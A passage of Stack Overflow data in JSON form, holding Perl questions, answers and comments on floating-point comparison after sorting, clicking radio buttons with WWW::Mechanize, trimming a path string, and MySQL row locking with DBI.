re-create the problem manually in significantlly less code first and edit my post as soon as possible"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1457384581, "post_id": 35853361, "comment_id": 59373626, "body": "It&#39;s not a correct assumption. Floating point numbers are stored as a binary fraction. This leads to rounding errors, and can lead to rounding errors in ways you don&#39;t expect. But comparisons should work pretty consistently."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457393933, "post_id": 35853361, "comment_id": 59378118, "body": "<code>$sorted[-1]</code> is a more concise way of accessing the last element of <code>@sorted</code>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1457397975, "post_id": 35853361, "comment_id": 59379355, "body": "Comparing float point is tricky, but you certainly <i>cannot</i> use <code>==</code>."}, {"owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 0, "creation_date": 1457400558, "post_id": 35853361, "comment_id": 59380120, "body": "&quot;inputs are identical&quot; This may seem so, but marginal differences in floating point numbers can sneak in, depending on whether it is given as a literal in the program or whether the same sequence of numeric characters is read in the input. If you want to get to the bottom of it, use pack to get the bytes of the number&#39;s machine representation."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457400691, "post_id": 35853361, "comment_id": 59380154, "body": "@zdim Sure you can. <code>$ perl -e &#39;print 3.1415926 == 3.1415926&#39;</code>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1457404641, "post_id": 35853361, "comment_id": 59381173, "body": "@MattJacob  The question is about comparing them correctly and I am referring to that, &quot;<i>cannot use</i>.&quot;   Are you raising a point about the language I am using? The question is about the dreadful <code>x == y</code> with floating point -- I think that we have to say &#39;<i>don&#39;t do that.</i>&#39;   Please somebody write that nicely and I won&#39;t post a thing anymore."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 4, "last_activity_date": 1457388123, "last_edit_date": 1457388123, "creation_date": 1457383357, "answer_id": 35853609, "question_id": 35853361, "link": "https://stackoverflow.com/questions/35853361/are-floating-point-numbers-changed-when-sorted-in-perl/35853609#35853609", "title": "are floating point numbers changed when sorted in perl?", "body": "<p>If I understand correctly, you are wondering why <code>==</code> is returning false and <code>&gt;</code> is returning true for what appear to be identical numbers. Obviously, the numbers are not actually identical. You can see this by printing more digits.</p>\n\n<pre><code>printf \"sorted: %.80e is gt truevalue:%.80e\\n\", $sorted[$#sorted], $truevalue;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457446270, "post_id": 35862904, "comment_id": 59403049, "body": "Re &quot;No, sort will not change values&quot;, unless the numbers were initially strings."}, {"owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1457447606, "post_id": 35862904, "comment_id": 59404038, "body": "@ikegami After <code>@a = sort {$a&lt;=&gt;$b}(&quot;12.34000&quot;, &quot;+45.67&quot;); </code>, the resulting list prints as <code>12.34000+45.67</code>, as opposed to the result of <code>map( 0+$_,(...))</code>. Clearly, for the sort, it has to be converted to numeric, but is this the issue discussed here?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1457448040, "post_id": 35862904, "comment_id": 59404362, "body": "It might be. The OP provided so little info."}], "tags": [], "owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "is_accepted": false, "score": 3, "last_activity_date": 1457427707, "last_edit_date": 1457427707, "creation_date": 1457427299, "answer_id": 35862904, "question_id": 35853361, "link": "https://stackoverflow.com/questions/35853361/are-floating-point-numbers-changed-when-sorted-in-perl/35862904#35862904", "title": "are floating point numbers changed when sorted in perl?", "body": "<p>No, sort will not change values. One has to assume that there <em>is</em> a difference in the way these two values have been produced.</p>\n\n<p>It is most certainly possible to use <code>==</code> with floating point numbers (FPN), returning true if a pair of 64 bit quantities is identical. But one has to be very careful when one ask the question \"Are these two FPNs equal?\"</p>\n\n<p>A (relatively small but still considerable) quantity of integers and rational numbers can be represented accurately in a FPN. For these (and only for these), questions such as \"Is the FPN a <em>equal</em> to 1.5?\" (written as <code>$a==1.5</code>) <em>may</em> make sense <em>but only if you are confident about the genesis of the value</em> in $a. - Don't take this lightly: will both of the following statements print \"1\"?</p>\n\n<pre><code>print 0.12345678901234567 == 1.2345678901234567E-1,\"\\n\";\nprint 0.12345678901234567 == 12.345678901234567E-2,\"\\n\";\n</code></pre>\n\n<p>All FPNs are not only representatives of the value <em>x</em> they represent accurately. They are also responsible for an <em>interval</em> of real numbers, including rational, irrational and transcendent (and even integer) numbers \"a little greater and a little smaller\" than <em>x</em>. You can quantify \"a little\": it is 1e-16 for x == 1.0, and shrinks or grows accordingly. So, for instance, 1+1e-17 will be 1.0 on your computer. You can input this number, but the FPN will be 1.0 all the same. Asking whether a FPN as the result of some computation equals 1+1e-17 doesn't make sense since you cannot even tell the computer that value.</p>\n\n<p>The solution isn't difficult. Instead of asking for equality you have to ask \"Is the FPN <em>a</em> in an interval [<em>p</em>,<em>q</em>] around x?\" Determining <em>p</em> and <em>q</em> should be given a little thought, as a suitable choice of these values primarily depends on <em>x</em>. The usual formula is something like</p>\n\n<pre><code>abs( $a - $expect ) &lt;= $expect*PRECISION\n</code></pre>\n\n<p>where <code>PRECISION</code> could be, for instance, 1e-12. (The value to use here may depend on the algorithm you use for computing <code>$a</code>, or on your needs, or both.) </p>\n\n<p>Finally: due to the mathematical properties of FP machine instructions, the usual arithmetic laws of associativity or distributivity are not guaranteed. The effect of truncation in addition or subtraction may, for instance cause heavy distortion in the result. A typical example for illustrating this, compute some Taylor series: once adding terms in decreasing order until terms become smaller than a given limit, and once, using the same terms, but in increasing order.</p>\n"}], "owner": {"reputation": 85, "user_id": 3412393, "user_type": "registered", "accept_rate": 60, "profile_image": "https://graph.facebook.com/791837855/picture?type=large", "display_name": "user3412393", "link": "https://stackoverflow.com/users/3412393/user3412393"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 330, "favorite_count": 1, "answer_count": 2, "score": 1, "last_activity_date": 1457512775, "creation_date": 1457382503, "last_edit_date": 1457395471, "question_id": 35853361, "link": "https://stackoverflow.com/questions/35853361/are-floating-point-numbers-changed-when-sorted-in-perl", "title": "are floating point numbers changed when sorted in perl?", "body": "<p>I'm running a statistical bootstrap at 10k permutations, which I'm trying to compare against an observed value. The observed is supposed to be identical to the max of the 10k permutations. The way I am measuring this is by attempting to find its percentile.</p>\n\n<p>All results of the 10k permutations (10,000 random numbers) are stored in an array, which I sort using:</p>\n\n<pre><code>my @sorted = sort {$a &lt;=&gt; $b} @permutednumbers;\n</code></pre>\n\n<p>When I then compare the observed value <code>$truevalue</code>, I'm getting an inaccurate comparison. These are stored as floating point numbers. The bootstrapping procedure uses the same formula for generating the random number so it should be absolutely identical, but when comparing the same value, it becomes inaccurate. I'm testing this with:</p>\n\n<pre><code>if ($sorted[$#sorted] == $truevalue) {\n  print \"sorted: $sorted[$#sorted] is eq truevalue:$truevalue\\n\";\n} elsif ($sorted[$#sorted] &gt; $truevalue) {\n  print \"sorted: $sorted[$#sorted] is gt truevalue:$truevalue\\n\";\n} elsif ($sorted[$#sorted] &lt; $truevalue) {\n   print \"sorted: $sorted[$#sorted] is lt truevalue:$truevalue, totalpermvalues; $totalpermvalues\\n\";\n}\n</code></pre>\n\n<p>output: </p>\n\n<pre><code>sorted: 0.937864522389543 is gt truevalue:0.937864522389543\n</code></pre>\n\n<p>So I get that floating point numbers aren't printed in complete accuracy, but I always assumed internally the computer stores the correct numbers. Is that not a correct assumption? Of course I can fix this quickly by changing them into integers of some sort, but is this something that I should be doing automatically all the time? Are floating point numbers just dangerous to use? Those exact values should be identical given that they are outputs of identical inputs, which is what is confusing me...</p>\n\n<p>If this matters, the values are individually calculated using the linear_interpolate function in Math::Interpolate package, but the inputs are identical.</p>\n"}, {"tags": ["perl", "mechanize"], "comments": [{"owner": {"reputation": 75, "user_id": 4637619, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dffcc7898473ccda57837eac2146260f?s=128&d=identicon&r=PG&f=1", "display_name": "ccca", "link": "https://stackoverflow.com/users/4637619/ccca"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1457380524, "post_id": 35852476, "comment_id": 59371271, "body": "I actually get it , but could not understand how can I specify to click the radio button with value &quot;1&quot;"}], "answers": [{"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 75, "user_id": 4637619, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dffcc7898473ccda57837eac2146260f?s=128&d=identicon&r=PG&f=1", "display_name": "ccca", "link": "https://stackoverflow.com/users/4637619/ccca"}, "edited": false, "score": 0, "creation_date": 1457381665, "post_id": 35852657, "comment_id": 59371953, "body": "@ccca Welcome -- I added a bit more, to make it more useful.  Let me know if it needs else/more."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 3, "last_activity_date": 1457382133, "last_edit_date": 1457382133, "creation_date": 1457380063, "answer_id": 35852657, "question_id": 35852476, "link": "https://stackoverflow.com/questions/35852476/perl-mechanize-click-a-radio-button/35852657#35852657", "title": "Perl Mechanize Click A Radio Button", "body": "<p>The user agent cannot magically distinguish the right one. Find them all, and then go through them and pick the one(s) you need. You can learn values by the method <code>possible_values</code> </p>\n\n<pre><code># Finding the field name and values for the radio element\nforeach ( $ua-&gt;find_all_inputs(type =&gt; 'radio') ) {\n    $radio_name = $_-&gt;name;\n    say \"$radio_name values: \" . join('|', $_-&gt;possible_values)\n}     \n</code></pre>\n\n<p>If it's just one</p>\n\n<pre><code>my ($radio_name, $input_err) = \n    map $_-&gt;name, $ua-&gt;find_all_inputs(type =&gt; 'radio');\nwarn \"More radio inputs than expected: $!\" if defined($input_err);\n</code></pre>\n\n<p>Once you have the right button you can fill the form in which it is. For example</p>\n\n<pre><code>$ua-&gt;submit_form( fields =&gt; { $radio_name =&gt; 'AND' });\n</code></pre>\n\n<p>The <code>submit_form</code> \"<em>lets you select a form from the previously fetched page, fill in its fields, and submit it.</em>\" [from docs, <a href=\"http://search.cpan.org/~ether/WWW-Mechanize-1.75/lib/WWW/Mechanize.pm\" rel=\"nofollow\">WWW::Mechanize</a>]. It takes parameters as hashes, where you can set names and values, for example.  This method is a higher-level wrapper, instead of which you can use more specific ones, for example</p>\n\n<pre><code>$ua-&gt;field( $name, $value );\n</code></pre>\n\n<p>To set a field among duplicate ones, pick the number of the one you want. For example, to set the second one from the list</p>\n\n<pre><code>$ua-&gt;set_fields( $name =&gt; [ 'field_value', 2 ] )\n</code></pre>\n\n<p>Also note that <code>WWW::Mechanize</code> inherits heavily.  When you search for the right call it may be a good idea to look through methods in the packages that it inherits from.</p>\n"}], "owner": {"reputation": 75, "user_id": 4637619, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/dffcc7898473ccda57837eac2146260f?s=128&d=identicon&r=PG&f=1", "display_name": "ccca", "link": "https://stackoverflow.com/users/4637619/ccca"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 397, "favorite_count": 1, "accepted_answer_id": 35852657, "answer_count": 1, "score": 1, "last_activity_date": 1457382133, "creation_date": 1457379542, "question_id": 35852476, "link": "https://stackoverflow.com/questions/35852476/perl-mechanize-click-a-radio-button", "title": "Perl Mechanize Click A Radio Button", "body": "<p>I am trying to click a radio button by using Perl with Mechanize module . I tried </p>\n\n<pre><code>$mech-&gt;find_all_inputs ( name =&gt; \"name\" , value =&gt; \"1\" ) \n</code></pre>\n\n<p>, but could not get any result. The html code of the radio button is like that;</p>\n\n<pre><code>&lt;input name=\"name\" value=\"1\" type=\"radio\"&gt;\n</code></pre>\n\n<p>And there are other radio buttons with the same name but different values.So how can I click the radio button using Mechanize module?\nThank you in advance.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1457371479, "post_id": 35849642, "comment_id": 59365675, "body": "<code>s&#47;\\s+$&#47;&#47;</code> is a right trim"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 2, "creation_date": 1457372396, "post_id": 35849642, "comment_id": 59366229, "body": "It&#39;s worth noting that this wouldn&#39;t be a trim in PHP, either. In most languages, &quot;trim&quot; means to strip whitespace from the beginning of a string, the end of a string, or both."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457375775, "post_id": 35849642, "comment_id": 59368276, "body": "Please show the left trim in PHP that you want to emulate"}], "answers": [{"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 3, "last_activity_date": 1457370391, "creation_date": 1457370391, "answer_id": 35849690, "question_id": 35849642, "link": "https://stackoverflow.com/questions/35849642/trimming-a-string-value/35849690#35849690", "title": "Trimming a string value", "body": "<p>Something like this should do it:</p>\n\n<pre><code>my $str = \"user1/es/public_html/shop/images/banners/326583.jpg\";\n$str =~ s|.*(?=/shop/)||;\nprint $str; #\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>/shop/images/banners/326583.jpg\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1246, "user_id": 4577456, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10152662960092727/picture?type=large", "display_name": "Liam Fell", "link": "https://stackoverflow.com/users/4577456/liam-fell"}, "edited": false, "score": 0, "creation_date": 1457370739, "post_id": 35849783, "comment_id": 59365172, "body": "Thanks, I&#39;m new to Perl. What is the use &#39;v5.14&#39;; in relation too?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1457370832, "post_id": 35849783, "comment_id": 59365244, "body": "That enforces certain perl versions, and enables features. In this case <code>say</code> - which is like <code>print</code> but it adds a line feed automatically."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 1246, "user_id": 4577456, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10152662960092727/picture?type=large", "display_name": "Liam Fell", "link": "https://stackoverflow.com/users/4577456/liam-fell"}, "edited": false, "score": 0, "creation_date": 1457371085, "post_id": 35849783, "comment_id": 59365428, "body": "@Liam: The doumentation is <a href=\"http://perldoc.perl.org/functions/use.html\" rel=\"nofollow noreferrer\">here</a>. It is equivalent to <code>use strict</code> together with <code>use feature</code> for all features available to version 14 of Perl 5. I used it here to mainly as a shorthand for <code>use strict</code> and <code>use feature &#39;say&#39;</code>. If It were a full program then I would have added those requirements explicitly"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 4, "last_activity_date": 1457370662, "creation_date": 1457370662, "answer_id": 35849783, "question_id": 35849642, "link": "https://stackoverflow.com/questions/35849642/trimming-a-string-value/35849783#35849783", "title": "Trimming a string value", "body": "<p>The most obvious solution is to <em>capture</em> the part you want\u2014everything from <code>/shop</code> onwards. Note that I've used braces <code>{}</code> instead of the default slash to delimit the regex so that I don't have to escape the slash in the pattern</p>\n\n<pre><code>use v5.14;\n\nmy $s = 'user1/es/public_html/shop/images/banners/326583.jpg';\n\nsay my ($trimmed) = $s =~ m{(/shop.*)};\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>/shop/images/banners/326583.jpg\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "is_accepted": false, "score": 0, "last_activity_date": 1457372771, "creation_date": 1457372771, "answer_id": 35850423, "question_id": 35849642, "link": "https://stackoverflow.com/questions/35849642/trimming-a-string-value/35850423#35850423", "title": "Trimming a string value", "body": "<p>If you don't need the full power of the regular expression engine---and it looks like you don't in this case---then you can use <a href=\"http://perldoc.perl.org/functions/index.html\" rel=\"nofollow\"><code>index</code></a> and <a href=\"http://perldoc.perl.org/functions/substr.html\" rel=\"nofollow\"><code>substr</code></a> instead:</p>\n\n<pre><code>my $str = 'user1/es/public_html/shop/images/banners/326583.jpg';\n$str = substr($str, index($str, '/shop'));\n</code></pre>\n"}], "owner": {"reputation": 1246, "user_id": 4577456, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10152662960092727/picture?type=large", "display_name": "Liam Fell", "link": "https://stackoverflow.com/users/4577456/liam-fell"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1457372771, "creation_date": 1457370254, "question_id": 35849642, "link": "https://stackoverflow.com/questions/35849642/trimming-a-string-value", "title": "Trimming a string value", "body": "<p>I'm attempting to perform what would be a PHP left trim in Perl.</p>\n\n<p>I have the following string value:</p>\n\n<pre><code>user1/es/public_html/shop/images/banners/326583.jpg\n</code></pre>\n\n<p>I need to trim everything from the left of '/shop', so my string value will look like this:</p>\n\n<pre><code>/shop/images/banners/326583.jpg\n</code></pre>\n\n<p>I have the following which removes white space, is the best solution here to apply 'user1/eschemtrad/public_html' to the reg ex?</p>\n\n<pre><code>my $image = $banners[$i]{'imageloc'};\n\n   $image =~ s/\\s+$//;\n</code></pre>\n"}, {"tags": ["mysql", "perl", "locking", "dbi", "dbd"], "answers": [{"comments": [{"owner": {"reputation": 2997, "user_id": 3239842, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/43fb8ed63990c7b890667c0a6c5e4674?s=128&d=identicon&r=PG&f=1", "display_name": "Binarus", "link": "https://stackoverflow.com/users/3239842/binarus"}, "edited": false, "score": 0, "creation_date": 1457369767, "post_id": 35849326, "comment_id": 59364519, "body": "Just for my understanding: h_ST -&gt; execute($s_ID) on its own already sets the locks. Did I get this right? You are saying that it also fetches the data, but where does it fetch to? I suppose to some internal buffer on the server side?"}, {"owner": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "reply_to_user": {"reputation": 2997, "user_id": 3239842, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/43fb8ed63990c7b890667c0a6c5e4674?s=128&d=identicon&r=PG&f=1", "display_name": "Binarus", "link": "https://stackoverflow.com/users/3239842/binarus"}, "edited": false, "score": 0, "creation_date": 1457369855, "post_id": 35849326, "comment_id": 59364584, "body": "The rows are locked before the data is read by the MySQL server and data is sent to the requestor, this way it is guaranteed the the server returns the latest data which can&#39;t be modified by any other client/thread"}, {"owner": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1457373326, "post_id": 35849326, "comment_id": 59366793, "body": "@Borodin The question was specifically for MySQL with InnoDB"}, {"owner": {"reputation": 37436, "user_id": 1215106, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/615ff12525dbd5868b7c78d9754aed72?s=128&d=identicon&r=PG", "display_name": "\u2126mega", "link": "https://stackoverflow.com/users/1215106/%e2%84%a6mega"}, "edited": false, "score": 0, "creation_date": 1571776093, "post_id": 35849326, "comment_id": 103351149, "body": "You wrote: &quot;<i>The rows will be locked until</i> <code>commit</code> <i>or</i> <code>rollback</code>.&quot;. Shouldn&#39;t be that &quot;<i>The rows will be locked until</i> <code>commit</code>, <code>rollback</code>, <code>disconnect</code>, <i>or until the application ends, whichever comes first.</i>&quot;?"}, {"owner": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "edited": false, "score": 0, "creation_date": 1571777360, "post_id": 35849326, "comment_id": 103351643, "body": "disconnect is a implicit rollback"}], "tags": [], "owner": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "is_accepted": true, "score": 3, "last_activity_date": 1598221447, "last_edit_date": 1598221447, "creation_date": 1457369222, "answer_id": 35849326, "question_id": 35848981, "link": "https://stackoverflow.com/questions/35848981/mysql-perl-dbi-execute-and-locking-exact-moment-of-locking/35849326#35849326", "title": "MySQL, Perl DBI, execute() and locking (exact moment of locking)", "body": "<blockquote>\n<p>$s_SQL = &quot;SELECT data from Users where ID = ? FOR UPDATE&quot;;</p>\n</blockquote>\n<p>Executing this will try to acquire a lock on the affected rows and then fetches the data (or waits until it gets an exclusive lock for all affected rows). This is done in order to be thread safe and only return data which is already locked: This way it is guaranteed the server returns the latest data which can't be modified by any other client/thread.</p>\n<p>The rows will be locked until commit or rollback.</p>\n<p>The behavior in MySQL cli client is the same as the locking is done in the server and not in the client library.</p>\n<p>This only holds for MySQL InnoDB tables. Other engines like MyISAM behave differently.</p>\n"}, {"comments": [{"owner": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "edited": false, "score": 0, "creation_date": 1457373210, "post_id": 35850357, "comment_id": 59366730, "body": "<code>there is no need to explicitly open a transaction yourself</code> this is not true., at least for MySQL. If there is no transaction, this will not lock anything."}, {"owner": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "edited": false, "score": 0, "creation_date": 1457373271, "post_id": 35850357, "comment_id": 59366762, "body": "&quot;Connections that need to access the data that you have locked will be suspended&quot;: only true for &quot;for update&quot; selects and write operations"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "edited": false, "score": 0, "creation_date": 1457374635, "post_id": 35850357, "comment_id": 59367580, "body": "@MrTux: Any <code>SELECT</code> will be denied access to locked data. Otherwise it&#39;s not locked!"}, {"owner": {"reputation": 28136, "user_id": 3906760, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/289d797f9cfa60788698c79e8bf25241?s=128&d=identicon&r=PG&f=1", "display_name": "MrTux", "link": "https://stackoverflow.com/users/3906760/mrtux"}, "edited": false, "score": 0, "creation_date": 1457375074, "post_id": 35850357, "comment_id": 59367871, "body": "Not tue and can easy verified on MySQL cli. normal &quot;select&quot; queries are not blocked (with isolation level repeatable read and innodb), for blocking all select queries you need to issue an additional read lock for the table."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, 